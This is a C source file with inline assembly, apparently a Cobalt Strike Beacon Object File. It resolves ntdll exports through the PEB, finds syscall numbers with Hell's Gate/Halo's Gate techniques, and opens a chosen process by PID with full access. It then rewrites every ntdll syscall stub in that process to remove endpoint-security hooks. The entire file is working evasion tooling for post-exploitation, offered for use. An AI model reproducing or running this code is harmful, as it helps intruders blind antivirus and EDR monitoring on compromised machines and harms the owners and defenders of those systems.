#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE	WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID	WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL	WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
DECLSPEC_IMPORT void* __cdecl  MSVCRT$memcpy(LPVOID, LPVOID, size_t);
DECLSPEC_IMPORT void __cdecl   MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1,const char *_Str2);

// Takes in the address of a DLL in memory and returns the DLL's Export Directory Address
//PVOID getExportDirectory(PVOID dllBase)
__asm__(
"getExportDirectory: \n"
	"mov r8, rcx \n"
	"mov ebx, [rcx+0x3C] \n"
	"add rbx, r8 \n"
	"xor rcx, rcx \n"
	"add cx, 0x88 \n"
	"mov eax, [rbx+rcx] \n"
	"add rax, r8 \n"
	"ret \n" // return ExportDirectory;
);
// Return the address of the Export Address Table
// PVOID getExportAddressTable(PVOID dllBase, PVOID ExportDirectory)
//                                    RCX              RDX
__asm__(
"getExportAddressTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
	"ret \n" // return ExportAddressTable
);
// Return the address of the Export Name Table
// PVOID getExportNameTable(PVOID dllBase, PVOID ExportDirectory)
//                                 RCX              RDX
__asm__(
"getExportNameTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressOfNames
	"ret \n" // return ExportNameTable;
);
// Return the address of the Export Ordinal Table
// PVOID getExportOrdinalTable(PVOID dllBase, PVOID ExportDirectory)
//                                 RCX              RDX
__asm__(
"getExportOrdinalTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals
	"ret \n" // return ExportOrdinalTable;
);
// PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
__asm__(
"getSymbolAddress: \n"
	"mov r10, [RSP+0x28] \n" // ExportNameTable
	"mov r11, [RSP+0x30] \n" // ExportOrdinalTable
	"xchg rcx, rdx \n" // RCX = symbolStringSize & RDX =symbolString
	"push rcx \n" // push str len to stack
	"xor rax, rax \n"
"loopFindSymbol: \n"
	"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
	"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
	"mov edi, [r10+rax*4] \n"       // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
	"add rdi, r8 \n"                // RDI = &NameString    = RVA NameString + &module.dll
	"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
	"repe cmpsb \n"                 // Compare strings at RDI & RSI
	"je FoundSymbol \n"             // If match then we found the API string. Now we need to find the Address of the API
	"inc rax \n"                    // Increment to check if the next name matches
	"jmp short loopFindSymbol \n"   // Jump back to start of loop
"FoundSymbol: \n"
	"pop rcx \n"                    // Remove string length counter from top of stack
	"mov ax, [r11+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
	"mov eax, [r9+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
	"add rax, r8 \n"                // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
	"sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
	"jns isNotForwarder \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
	"xor rax, rax \n"               // If forwarder, return 0x0 and exit
"isNotForwarder: \n"
	"ret \n"
);
__asm__(
"findSyscallNumber: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);
__asm__(
"error: \n"
	"xor rax, rax \n"
	"ret \n"
);
__asm__(
"halosGateUp: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"xor rax, rax \n"
	"mov al, 0x20 \n"
	"mul dx \n"
	"add rcx, rax \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);
__asm__(
"halosGateDown: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"xor rax, rax \n"
	"mov al, 0x20 \n"
	"mul dx \n"
	"sub rcx, rax \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);
__asm__(
	"HellsGate: \n"
	"xor r11, r11 \n"
	"mov r11d, ecx \n"
	"ret \n"
);
__asm__(
"HellDescent: \n"
	"xor rax, rax \n"
	"mov r10, rcx \n"
	"mov eax, r11d \n"
	"syscall \n"
	"ret \n"
);

// Windows Internals structs from ProcessHacker, Sektor7, and github
typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOL       Initialized;
    LPVOID     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE                         InheritedAddressSpace;
    BYTE                         ReadImageFileExecOptions;
    BYTE                         BeingDebugged;
    BYTE                         _SYSTEM_DEPENDENT_01;
    LPVOID                       Mutant;
    LPVOID                       ImageBaseAddress;
    PPEB_LDR_DATA                Ldr;
} PEB, * PPEB;

typedef struct _TEB
{
    NT_TIB NtTib;
    LPVOID EnvironmentPointer;
    HANDLE ClientIdUniqueProcess;
    HANDLE ClientIdUniqueThread;
    LPVOID ActiveRpcHandle;
    LPVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;
} TEB, * PTEB;

typedef struct UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWCH Buffer;
}UNICODE_STRING2;

typedef struct LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    };
    LPVOID DllBase;
    LPVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING2 FullDllName;
    UNICODE_STRING2 BaseDllName;
}LDR_DATA_TABLE_ENTRY2, * PLDR_DATA_TABLE_ENTRY;

typedef struct Export {
    LPVOID Directory;
    LPVOID AddressTable;
    LPVOID NameTable;
    LPVOID OrdinalTable;
}Export;

typedef struct Dll {
    HMODULE dllBase;
    Export Export;
}Dll;

// ASM Function Declaration
LPVOID getExportDirectory(LPVOID dllAddr);
LPVOID getExportAddressTable(LPVOID dllBase, LPVOID dllExportDirectory);
LPVOID getExportNameTable(LPVOID dllBase, LPVOID dllExportDirectory);
LPVOID getExportOrdinalTable(LPVOID dllBase, LPVOID dllExportDirectory);
LPVOID getSymbolAddress(LPVOID symbolString, LPVOID symbolStringSize, LPVOID dllBase, LPVOID ExportAddressTable, LPVOID ExportNameTable, LPVOID ExportOrdinalTable);
// // HellsGate / HalosGate
VOID HellsGate(IN WORD wSystemCall);
VOID HellDescent();
DWORD halosGateDown(IN PVOID ntdllApiAddr, IN WORD index);
DWORD halosGateUp(IN PVOID ntdllApiAddr, IN WORD index);
DWORD findSyscallNumber(IN PVOID ntdllApiAddr);

// Define NT APIs
//typedef BOOL   (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef BOOL(NTAPI* tNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PVOID);
// NtWriteVirtualMemory(RCX:FFFFFFFFFFFFFFFF, RDX: 00007FFA4D2FF1A0 (Addr ntdll.EtwEventWrite), R9:0x1, R10:0x0)
// https://github.com/jthuraisamy/SysWhispers/blob/523f5939ceb238070649d5c111e9733ae9e0940d/example-output/syscalls.h
/*NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN ULONG NumberOfBytesToWrite,
    OUT PULONG NumberOfBytesWritten OPTIONAL);*/
typedef BOOL(NTAPI* tNtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);
//                                                 RCX     RDX     R8     R9    
// NtWriteVirtualMemory(
//   RCX: FFFFFFFFFFFFFFFF 
//   RDX: 00000000005FFC70 -> 00 F0 2F 4D FA 7F 00 00 00  (00007FFA4D2FF000)
//   R8:  00000000005FFC78 -> 00 10 00 00 00 00 00 00 00  (0x1000)
//   R9:  0000000020000080
// )
//typedef HANDLE (WINAPI * tOpenProcess)(DWORD, WINBOOL, DWORD);
// https://github.com/n00bk1t/n00bk1t/blob/master/ntopenprocess.c
// Structs for NtOpenProcess
//typedef HANDLE (WINAPI * tOpenProcess)(DWORD, WINBOOL, DWORD);
// https://github.com/n00bk1t/n00bk1t/blob/master/ntopenprocess.c
// Structs for NtOpenProcess
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG	uLength;
    HANDLE	hRootDirectory;
    PVOID   pObjectName;
    ULONG	uAttributes;
    PVOID	pSecurityDescriptor;
    PVOID	pSecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID
{
    HANDLE	pid;
    HANDLE	UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess
/* NTSTATUS NtOpenProcess(
  IN  PHANDLE            ProcessHandle,
  IN  ACCESS_MASK        DesiredAccess,
  IN  POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PCLIENT_ID         ClientId
);*/
//   RCX: 000000000014FDE8 // Just a 8 byte address to put a handle in
//   RDX: 00000000001FFFFF (PROCESS_ALL_ACCESS)
//   R8:  000000000014FD90 -> 0x30
//   R9:  000000000014FD80 -> 28A4h (process ID in Hex)
typedef BOOL(NTAPI* tNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);


typedef struct ntapis {
    tNtWriteVirtualMemory NtWriteVirtualMemory;
    DWORD NtWriteVirtualMemorySyscall;
    tNtProtectVirtualMemory NtProtectVirtualMemory;
    DWORD NtProtectVirtualMemorySyscall;
    tNtOpenProcess NtOpenProcess;
    DWORD NtOpenProcessSyscall;
}ntapis;

PPEB getPEB() {
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    return peb;
};

LPVOID makeShellcode(unsigned char* shellcode, DWORD syscallNumber) {
    LPVOID scPosition = shellcode;
    // Shellcode Block 1
    unsigned __int64 scSize = 4;
    unsigned char scBlock1[] =
        "\x4C\x8B\xD1"                      // mov r10,rcx
        "\xB8"; //"\xD3\x01\x00\x00"        // mov eax, <SYSCALL NUMBER>
    MSVCRT$memcpy(scPosition, scBlock1, scSize);
    scPosition = (char*)scPosition + scSize;
    MSVCRT$memcpy(scPosition, &syscallNumber, sizeof(DWORD)); // write the syscall to the shellcode
    scPosition = (char*)scPosition + sizeof(DWORD);
    scSize = 24;
	unsigned char scBlock2[] =
        "\xF6\x04\x25\x08\x03\xFE\x7F\x01"  // test byte ptr ds:[7FFE0308],1
        "\x75\x03"                          // jne ntdll.7FFB73FD07C5
        "\x0F\x05"                          // syscall
        "\xC3"                              // ret
        "\xCD\x2E"                          // int 2E
        "\xC3"                              // ret
        "\x0F\x1F\x84\x00\x00\x01\x02\x03";  // nop dword ptr ds:[rax+rax],eax
    MSVCRT$memcpy(scPosition, scBlock2, scSize);
    return shellcode;
}

void go(char * args, int len) {
	datap parser;
	SIZE_T pid;
	BeaconDataParse(&parser, args, len);
	pid = BeaconDataInt(&parser);
    HANDLE hProc = NULL;
	OBJECT_ATTRIBUTES oa={sizeof(oa),0,NULL,0};
	CLIENT_ID cid;

    formatp stringFormatObject;  // Cobalt Strike beacon format object we will pass strings too
    BeaconFormatAlloc(&stringFormatObject, 64 * 1024); // allocate memory for our string blob

	// unsigned __int64 pid = 5736;
	//cid.pid = (HANDLE)8968;
	cid.pid = NULL;
	cid.UniqueThread = NULL;
	cid.pid = (HANDLE)pid;
    BeaconFormatPrintf(&stringFormatObject,"[+] PID: %d)\n", pid);
    BeaconFormatPrintf(&stringFormatObject,"[+] PID: %p)\n", pid);
    BeaconFormatPrintf(&stringFormatObject,"[+] cid.pid: %d)\n", cid.pid);
    BeaconFormatPrintf(&stringFormatObject,"[+] cid.pid: %p)\n", cid.pid);
	//BeaconFormatPrintf(&stringFormatObject,"Patching NTDLL System Call Stubs in Process: %d (PID)", pid);
    // Get Base Address of ntdll.dll
    WCHAR* ws_ntdll = L"ntdll.dll";
    Dll ntdll;
    unsigned __int64 qwSize = 0x100;
    LPVOID scBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, qwSize);
    MSVCRT$memset(scBuffer, 0x00, qwSize);
    // Modified method from Sektor7 Malware Dev Course - https://institute.sektor7.net/
    //PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PPEB peb = getPEB();
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* ModuleList = NULL;
    ModuleList = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

    for (LIST_ENTRY* pListEntry = pStartListEntry;  // start from beginning of InMemoryOrderModuleList
        pListEntry != ModuleList;	               	// walk all list entries
        pListEntry = pListEntry->Flink) {

        // get current Data Table Entry
        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

        // Check if BaseDllName is ntdll and return DLL base address
        if (MSVCRT$strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)ws_ntdll) == 0) {
            ntdll.dllBase = (HMODULE)pEntry->DllBase;
        }
    }

    // Get Export Directory and Export Tables for ntdll.DLL
    ntdll.Export.Directory = getExportDirectory((LPVOID)ntdll.dllBase);
    ntdll.Export.AddressTable = getExportAddressTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable = getExportNameTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable = getExportOrdinalTable((LPVOID)ntdll.dllBase, ntdll.Export.Directory);
    //BeaconPrintf(CALLBACK_OUTPUT,"ntdll.Export.Directory    : %p\n", ntdll.Export.Directory);
    //BeaconPrintf(CALLBACK_OUTPUT,"ntdll.Export.AddressTable : %p\n", ntdll.Export.AddressTable);
    //BeaconPrintf(CALLBACK_OUTPUT,"ntdll.Export.NameTable    : %p\n", ntdll.Export.NameTable);
    //BeaconPrintf(CALLBACK_OUTPUT,"ntdll.Export.OrdinalTable : %p\n", ntdll.Export.OrdinalTable);
    CHAR* ptrNumberOfFunctions = (CHAR*)ntdll.Export.Directory + 0x14;
    PDWORD numberOfFunctions = (PDWORD)ptrNumberOfFunctions;
    //BeaconPrintf(CALLBACK_OUTPUT,"&ntdll.numberOfFunctions  : %p\n", ptrNumberOfFunctions);
    //BeaconPrintf(CALLBACK_OUTPUT,"ntdll.numberOfFunctions   : %d\n", *numberOfFunctions);
    // Discover the syscalls for NtProtectVirtualMemory, NtWriteVirtualMemory, 
    ntapis nt;
    // ntdll.NtProtectVirtualMemory
    CHAR NtProtectVirtualMemoryStr[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    nt.NtProtectVirtualMemory = getSymbolAddress(NtProtectVirtualMemoryStr, (PVOID)22, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    // HalosGate/HellsGate to get the systemcall number for NtProtectVirtualMemory
    //__debugbreak();
    nt.NtProtectVirtualMemorySyscall = findSyscallNumber(nt.NtProtectVirtualMemory);
    if (nt.NtProtectVirtualMemorySyscall == 0) {
        DWORD index = 0;
        while (nt.NtProtectVirtualMemorySyscall == 0) {
            index++;
            // Check for unhooked Sycall Above the target stub
            nt.NtProtectVirtualMemorySyscall = halosGateUp(nt.NtProtectVirtualMemory, index);
            if (nt.NtProtectVirtualMemorySyscall) {
                nt.NtProtectVirtualMemorySyscall = nt.NtProtectVirtualMemorySyscall - index;
                break;
            }
            // Check for unhooked Sycall Below the target stub
            nt.NtProtectVirtualMemorySyscall = halosGateDown(nt.NtProtectVirtualMemory, index);
            if (nt.NtProtectVirtualMemorySyscall) {
                nt.NtProtectVirtualMemorySyscall = nt.NtProtectVirtualMemorySyscall + index;
                break;
            }
        }
    }
    BeaconFormatPrintf(&stringFormatObject,"[+] ntdll.NtProtectVirtualMemory Address: %p\n[+] ntdll.NtProtectVirtualMemory Syscall: %d | 0x%x\n",nt.NtProtectVirtualMemory, nt.NtProtectVirtualMemorySyscall, nt.NtProtectVirtualMemorySyscall);
    // ntdll.NtWriteVirtualMemory
    // NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN ULONG NumberOfBytesToWrite, OUT PULONG NumberOfBytesWritten OPTIONAL);
    // bobby.cooke$ python3 string2Array.py NtWriteVirtualMemoryStr NtWriteVirtualMemory
    CHAR NtWriteVirtualMemoryStr[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    nt.NtWriteVirtualMemory = getSymbolAddress(NtWriteVirtualMemoryStr, (PVOID)20, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    nt.NtWriteVirtualMemorySyscall = findSyscallNumber(nt.NtWriteVirtualMemory);
    if (nt.NtWriteVirtualMemorySyscall == 0) {
        DWORD index = 0;
        while (nt.NtWriteVirtualMemorySyscall == 0) {
            index++;
            // Check for unhooked Sycall Above the target stub
            nt.NtWriteVirtualMemorySyscall = halosGateUp(nt.NtWriteVirtualMemory, index);
            if (nt.NtWriteVirtualMemorySyscall) {
                nt.NtWriteVirtualMemorySyscall = nt.NtWriteVirtualMemorySyscall - index;
                break;
            }
            // Check for unhooked Sycall Below the target stub
            nt.NtWriteVirtualMemorySyscall = halosGateDown(nt.NtWriteVirtualMemory, index);
            if (nt.NtWriteVirtualMemorySyscall) {
                nt.NtWriteVirtualMemorySyscall = nt.NtWriteVirtualMemorySyscall + index;
                break;
            }
        }
    }
    BeaconFormatPrintf(&stringFormatObject,"[+] ntdll.NtWriteVirtualMemory Address: %p\n[+] ntdll.NtWriteVirtualMemory Syscall: %d | 0x%x\n",nt.NtWriteVirtualMemory, nt.NtWriteVirtualMemorySyscall, nt.NtWriteVirtualMemorySyscall);
    // ntdll.NtOpenProcess
    CHAR NtOpenProcessStr[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s',0 };
    nt.NtOpenProcess = getSymbolAddress(NtOpenProcessStr, (PVOID)13, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    nt.NtOpenProcessSyscall = findSyscallNumber(nt.NtOpenProcess);
    if (nt.NtOpenProcessSyscall == 0) {
        DWORD index = 0;
        while (nt.NtOpenProcessSyscall == 0) {
            index++;
            // Check for unhooked Sycall Above the target stub
            nt.NtOpenProcessSyscall = halosGateUp(nt.NtOpenProcess, index);
            if (nt.NtOpenProcessSyscall) {
                nt.NtOpenProcessSyscall = nt.NtOpenProcessSyscall - index;
                break;
            }
            // Check for unhooked Sycall Below the target stub
            nt.NtOpenProcessSyscall = halosGateDown(nt.NtOpenProcess, index);
            if (nt.NtOpenProcessSyscall) {
                nt.NtOpenProcessSyscall = nt.NtOpenProcessSyscall + index;
                break;
            }
        }
    }
    BeaconFormatPrintf(&stringFormatObject,"[+] ntdll.NtOpenProcess Address: %p\n[+] ntdll.NtOpenProcess Syscall: %d | 0x%x\n", nt.NtOpenProcess, nt.NtOpenProcessSyscall, nt.NtOpenProcessSyscall);
    // Get the address of the first syscall. Each syscall stub is 0x20 bytes. 
    //   &ntdll.NtOpenProcess - (NtOpenProcessSyscallNumber * 0x20) =  Address of first ntdll syscall stub
    // cast the NtOpenProcess address as a pointer to a char so we can do subtraction by 1's
    unsigned char* firstSyscallAddress = (unsigned char*)nt.NtOpenProcess;
    DWORD ntdllStubSize = 0x20;
    DWORD offsetFirstStub = ntdllStubSize * nt.NtOpenProcessSyscall;
    firstSyscallAddress -= offsetFirstStub;
    BeaconFormatPrintf(&stringFormatObject,"[+] offsetFirstStub: %d\n[+] FirstSyscallAddress: %p\n", offsetFirstStub, firstSyscallAddress);
    // 00007FFB73FD0810 - ntdll.NtLoadKey3 last stub
    // 00007FFB73FCCD60 = ntdll first stub address
    // 0x3AB0 - stubs diff size
    // 0x3AB0 / 2 = 0x1D5 = 469
    DWORD index = 0;
    DWORD syscallStubTotal = 0;
    unsigned char * stubIndexAddress = firstSyscallAddress;
    LPVOID lastSyscallStub = NULL;
    while (index < 600) {
        stubIndexAddress += 0x20;
        if (stubIndexAddress[0] != 0x4C) {
            if (stubIndexAddress[0] != 0xCC) {
				stubIndexAddress += 0x10; // All syscall stubs are 0x20 except for NtQuerySystemTime which is only x10 bytes
            }
            else {
                stubIndexAddress -= 0x20; // go back to the last stub
                BeaconFormatPrintf(&stringFormatObject,"[+] end of stubs at address %p\n", stubIndexAddress);
                lastSyscallStub = (LPVOID)stubIndexAddress;
                break;
            }
        }
        index++;
    }
    stubIndexAddress += 0x40;
    stubIndexAddress = (unsigned char *)(stubIndexAddress - firstSyscallAddress);
    SIZE_T stubsSize = (SIZE_T)stubIndexAddress;
    DWORD oldprotect = 0;
    //hProc = (HANDLE)-1;
    //ttNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
    /*
    HANDLE hProc = NULL;
	OBJECT_ATTRIBUTES oa={sizeof(oa),0,NULL,0};
	CLIENT_ID cid;
	// unsigned __int64 pid = 5736;
	//cid.pid = (HANDLE)8968;
	cid.pid = NULL;
	cid.UniqueThread = NULL;
	cid.pid = (HANDLE)pid;
	*/
    //__debugbreak();
    if(pid == -1){
        hProc = (HANDLE)-1;
    }
    else{
        // nt.NtOpenProcess(&hProc, 0x1FFFFF, &oa, &cid);
        HellsGate(nt.NtOpenProcessSyscall);
        HellDescent(&hProc, 0x1FFFFF, &oa, &cid);
    }

    unsigned char* firstSyscallAddress2 = firstSyscallAddress; // firstSyscallAddress gets clobbered after NtProtectVirtualMemorySyscall 
    //VirtualProtect(firstSyscallAddress, stubsSize, PAGE_EXECUTE_READWRITE, &oldprotect);
    HellsGate(nt.NtProtectVirtualMemorySyscall);
    HellDescent(hProc, &firstSyscallAddress, (PSIZE_T)&stubsSize, PAGE_EXECUTE_READWRITE, &oldprotect);
    syscallStubTotal = index;
    index = 0;
    unsigned char * stubIndexAddress2 = firstSyscallAddress2;
    //BeaconPrintf(CALLBACK_OUTPUT,"stubIndexAddress2: %p\n", stubIndexAddress2);
    while (index < syscallStubTotal) {
        makeShellcode(scBuffer,index);
        // nt.NtWriteVirtualMemory(hProc, nt.pEtwEventWrite, (PVOID)etwbypass, 1, (PVOID)0);
        HellsGate(nt.NtWriteVirtualMemorySyscall);
        HellDescent(hProc, stubIndexAddress2, scBuffer, 0x20, (PVOID)0);
        stubIndexAddress2 += 0x20;
        if (stubIndexAddress2[0] != 0x4C) {
            //BeaconPrintf(CALLBACK_OUTPUT,"if (stubIndexAddress2[0] != 0x4C) %p\n", stubIndexAddress2);
            if (stubIndexAddress2[0] != 0xCC) {
                //BeaconPrintf(CALLBACK_OUTPUT,"if (stubIndexAddress2[0] != 0xCC) %p\n", stubIndexAddress2);
                //BeaconPrintf(CALLBACK_OUTPUT,"index: %d\n", index);
                stubIndexAddress2 += 0x10; // All syscall stubs are 0x20 except for NtQuerySystemTime which is only x10 bytes
                index++;
            }
            else {
                //BeaconPrintf(CALLBACK_OUTPUT,"else %p\n", stubIndexAddress2);
                //BeaconPrintf(CALLBACK_OUTPUT,"index: %d\n", index);
                stubIndexAddress2 -= 0x20; // go back to the last stub
                BeaconFormatPrintf(&stringFormatObject,"[+] end of stubs at address %p\n", stubIndexAddress2);
                //BeaconPrintf(CALLBACK_OUTPUT,"%d\n", index);
                break;
            }
        }
        index++;
    }
    BeaconFormatPrintf(&stringFormatObject,"[+] Exited write loop at %p\n", stubIndexAddress2);
    //VirtualProtect(firstSyscallAddress, stubsSize, PAGE_EXECUTE_READ, &oldprotect);
    HellsGate(nt.NtProtectVirtualMemorySyscall);
    HellDescent(hProc, &firstSyscallAddress2, (PSIZE_T)&stubsSize, PAGE_EXECUTE_READ, &oldprotect);
    BeaconFormatPrintf(&stringFormatObject,"[+] End of bof\n");

    int sizeOfObject   = 0;
    char* outputString = NULL;
    outputString = BeaconFormatToString(&stringFormatObject, &sizeOfObject);
    BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
    BeaconFormatFree(&stringFormatObject);
    //getchar();
}